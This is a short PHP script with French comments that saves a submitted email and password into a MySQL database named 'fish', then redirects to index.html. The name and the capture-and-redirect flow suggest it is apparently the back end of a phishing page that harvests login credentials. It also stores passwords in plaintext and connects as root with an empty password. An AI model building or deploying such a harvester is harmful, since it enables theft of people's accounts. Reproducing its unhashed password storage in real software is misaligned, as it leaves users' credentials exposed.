<?php
$conn = new mysqli('localhost', 'root', '', 'fish');
if ($conn->connect_error) {
    die("Connexion échouée : " . $conn->connect_error);
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $mail = $_POST['mail'] ?? '';
    $password = $_POST['password'] ?? '';

    // Préparer la requête pour éviter les injections SQL
    $stmt = $conn->prepare("INSERT INTO login (mail, password) VALUES (?, ?)");
    $stmt->bind_param("ss", $mail, $password);
    $stmt->execute();
    $stmt->close();
    $conn->close();

    header('Location: index.html');
    exit;
}
?>
